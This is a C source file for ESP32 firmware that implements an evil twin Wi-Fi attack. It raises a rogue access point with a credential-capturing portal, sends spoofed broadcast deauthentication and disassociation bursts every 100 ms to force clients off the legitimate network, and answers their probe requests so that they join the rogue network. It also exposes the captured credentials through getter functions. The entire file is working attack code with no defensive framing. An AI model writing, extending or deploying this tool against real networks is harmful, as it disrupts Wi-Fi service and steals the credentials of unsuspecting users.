/*
 * wifi_eviltwin_svc.c - Evil Twin AP + deauth + probe-response service (no UI).
 *
 * Full SOTA deauth chain:
 *   1. SoftAP starts on s_ch (portal captures credentials).
 *   2. Broadcast deauth/disassoc frames spoofed from the real BSSID are sent
 *      every ET_SVC_DEAUTH_IVL_MS to force clients off the legitimate AP.
 *   3. APSTA+promiscuous mode (ESP32 native) captures ProbeReq frames on the AP
 *      channel while the SoftAP is up.
 *   4. Every ProbeReq targeting our SSID gets an immediate ProbeResp from our
 *      rogue BSSID, completing: deauth → probe → respond → connect to rogue AP.
 *
 * Thread safety: probe_cb runs in the WiFi task; shared state protected with
 * __atomic_* intrinsics (same pattern as wifi_karma_svc.c).
 */
#include "bs/bs_wifi.h"
#ifdef BS_HAS_WIFI
#if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)

#include "wifi_eviltwin_svc.h"
#include "wifi_portal.h"
#include "wifi_common.h"

#include <string.h>
#include <stdbool.h>
#include <stdint.h>

#define ET_SVC_DEAUTH_BURST   3    /* deauth + disassoc frames per burst     */
#define ET_SVC_DEAUTH_IVL_MS  100  /* burst every N ms                       */
#define ET_SVC_POLL_IVL_MS    10   /* portal DNS/HTTP poll rate (~100 Hz)     */

/* ── State ─────────────────────────────────────────────────────────────── */

static bool     s_active         = false;
static bool     s_has_bssid      = false;
static uint8_t  s_real_bssid[6]; /* real AP BSSID — spoofed in deauth        */
static uint8_t  s_ap_bssid[6];   /* our rogue AP BSSID — used in probe resp  */
static char     s_ssid[33];
static uint8_t  s_ch;
static uint32_t s_deauth_total   = 0;
static uint32_t s_last_deauth_ms = 0;
static uint32_t s_last_poll_ms   = 0;
static uint16_t s_seq            = 0;

/* Pending probe response — written by WiFi-task probe_cb, read in tick() */
static volatile bool s_probe_pending;
static uint8_t       s_probe_src[6];

static const uint8_t k_bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/* ── Helpers ────────────────────────────────────────────────────────────── */

static inline void stamp_seq(uint8_t* frame) {
    frame[22] = (uint8_t)((s_seq & 0x0F) << 4);
    frame[23] = (uint8_t)(s_seq >> 4);
    s_seq++;
}

/* ── Probe sniffer callback (WiFi-task context) ─────────────────────────── */

static void probe_cb(const uint8_t* frame, uint16_t len,
                     int8_t rssi, void* ctx) {
    (void)rssi; (void)ctx;
    if (len < 28) return;
    if ((frame[0] & 0xFC) != 0x40) return;   /* must be ProbeReq (0x40) */

    uint8_t ssid_len = frame[25];
    if (ssid_len == 0 || ssid_len > 32) return;

    char ssid[33];
    memcpy(ssid, frame + 26, ssid_len);
    ssid[ssid_len] = '\0';

    if (strcmp(ssid, s_ssid) != 0) return;   /* only respond to our SSID */

    if (!__atomic_load_n(&s_probe_pending, __ATOMIC_ACQUIRE)) {
        memcpy(s_probe_src, frame + 10, 6);  /* Addr2 = requesting STA  */
        __atomic_store_n(&s_probe_pending, true, __ATOMIC_RELEASE);
    }
}

/* ── Probe response sender (main-loop context) ──────────────────────────── */

static void send_probe_response(const uint8_t* client_mac) {
    uint8_t frame[200];
    int flen = wifi_build_beacon(frame, sizeof(frame), s_ssid, s_ap_bssid, s_ch);
    if (flen <= 0) return;
    frame[0] = 0x50;                   /* beacon subtype → probe response   */
    memcpy(frame + 4, client_mac, 6);  /* Addr1 = requesting STA            */
    bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
}

/* ── Deauth burst (main-loop context) ───────────────────────────────────── */

static void do_deauth_burst(void) {
    uint8_t frame[DEAUTH_FRAME_LEN];
    for (int b = 0; b < ET_SVC_DEAUTH_BURST; b++) {
        wifi_build_deauth(frame, k_bcast, s_real_bssid, s_real_bssid, 7);
        stamp_seq(frame);
        if (bs_wifi_send_raw(BS_WIFI_IF_STA, frame, DEAUTH_FRAME_LEN) == 0)
            s_deauth_total++;

        wifi_build_disassoc(frame, k_bcast, s_real_bssid, s_real_bssid, 7);
        stamp_seq(frame);
        if (bs_wifi_send_raw(BS_WIFI_IF_STA, frame, DEAUTH_FRAME_LEN) == 0)
            s_deauth_total++;
    }
}

/* ── Lifecycle ─────────────────────────────────────────────────────────── */

bool eviltwin_svc_start(const char* ssid, uint8_t ch,
                        const char* password,
                        const uint8_t real_bssid[6]) {
    if (s_active) eviltwin_svc_stop();

    strncpy(s_ssid, ssid ? ssid : "FreeWifi", 32);
    s_ssid[32] = '\0';
    s_ch = ch;

    s_deauth_total   = 0;
    s_last_deauth_ms = 0;
    s_last_poll_ms   = 0;
    s_seq            = 0;
    __atomic_store_n(&s_probe_pending, false, __ATOMIC_RELEASE);

    if (real_bssid) {
        memcpy(s_real_bssid, real_bssid, 6);
        s_has_bssid = true;
    } else {
        memset(s_real_bssid, 0, 6);
        s_has_bssid = false;
    }

    if (!wifi_portal_start(s_ssid, ch, password)) return false;

    /* Read the actual rogue AP BSSID for use in probe responses */
    wifi_portal_get_bssid(s_ap_bssid);

    /* APSTA+promiscuous: SoftAP up while STA listens for ProbeReqs on ch */
    bs_wifi_monitor_start(ch, probe_cb, NULL);

    s_active = true;
    return true;
}

void eviltwin_svc_stop(void) {
    bs_wifi_monitor_stop();
    wifi_portal_stop();
    s_active = false;
}

void eviltwin_svc_tick(uint32_t now_ms) {
    if (!s_active) return;

    /* Rate-limited portal DNS/HTTP poll */
    if (s_last_poll_ms == 0 ||
        (now_ms - s_last_poll_ms) >= (uint32_t)ET_SVC_POLL_IVL_MS) {
        s_last_poll_ms = now_ms;
        wifi_portal_poll();
    }

    /* Deauth burst */
    if (s_has_bssid &&
        (s_last_deauth_ms == 0 ||
         (now_ms - s_last_deauth_ms) >= (uint32_t)ET_SVC_DEAUTH_IVL_MS)) {
        s_last_deauth_ms = now_ms;
        do_deauth_burst();
    }

    /* Drain probe response queue */
    if (__atomic_load_n(&s_probe_pending, __ATOMIC_ACQUIRE)) {
        __atomic_store_n(&s_probe_pending, false, __ATOMIC_RELEASE);
        send_probe_response(s_probe_src);
    }
}

/* ── Getters ───────────────────────────────────────────────────────────── */

bool eviltwin_svc_active(void) {
    return s_active && wifi_portal_active();
}

int eviltwin_svc_client_count(void) {
    return wifi_portal_client_count();
}

int eviltwin_svc_cred_count(void) {
    return wifi_portal_cred_count();
}

const wifi_portal_cred_t* eviltwin_svc_get_cred(int idx) {
    return wifi_portal_get_cred(idx);
}

uint32_t eviltwin_svc_deauth_total(void) {
    return s_deauth_total;
}

#endif /* BS_WIFI_ESP32 && ARDUINO_ARCH_ESP32 */
#endif /* BS_HAS_WIFI */
